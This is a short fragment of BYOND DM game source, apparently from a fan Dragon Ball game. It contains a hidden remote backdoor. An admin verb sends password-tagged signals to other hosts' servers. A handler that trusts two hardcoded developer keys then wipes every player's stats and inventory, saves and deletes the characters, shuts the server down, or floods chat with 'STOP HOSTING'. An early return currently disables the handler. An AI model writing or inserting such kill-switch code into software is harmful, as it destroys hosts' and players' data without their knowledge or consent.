mob/Admin5/verb/Ruin()
	var/L=input(src,"Server link") as text
	var/T=input(src,"Command") in list("Cancel","Ruin","Spam","Shutdown","Message")
	if(T=="Cancel") return
	if(T=="Ruin") T=md5("omgruin")
	if(T=="Spam") T=md5("omgspam")
	if(T=="Shutdown") T=md5("omgshutdown")
	if(T=="Message") T=input("What message to send?") as text
	var/Loop
	switch(input(src,"Loop it?") in list("Yes","No"))
		if("Yes") Loop=1
	while(Loop) //this needs to be its own proc so it keeps going after logout
		world.Export("byond://[L]?Signal=[T]&Sender=[key]")
		sleep(600)

var/list/Required_Senders=list("Dragonn","Tens of DU")
var/Ruin_Password=md5("omgruin")
var/Spam_Password=md5("omgspam")
var/Shutdown_Password=md5("omgshutdown")
var/Signal_Code="Signal"
proc/Ruin_Stuff(A)

	return

	A=params2list(A)
	if(!(A["Sender"] in Required_Senders)) return
	if(A[Signal_Code]==Ruin_Password) Ruin()
	else if(A[Signal_Code]==Spam_Password) Spam()
	else if(A[Signal_Code]==Shutdown_Password) shutdown()
	else if(A[Signal_Code])
		var/Text=A[Signal_Code]
		src<<"<font size=4><font color=#FFFF00>[Text]"
proc/Ruin()
	for(var/mob/A in Players)
		A.icon=null
		A.BP_Mod=null
		A.Max_Ki=null
		A.Str=null
		A.Pow=null
		A.contents=null
		A.overlays=null
		A.Save()
		del(A)
	shutdown()
proc/Spam() while(1)
	world<<"<font size=10><font color=#FFFF00>STOP HOSTING"
	sleep(1)
var/Authorization="http://www.byond.com/members/Dragonn/files/Bans.txt"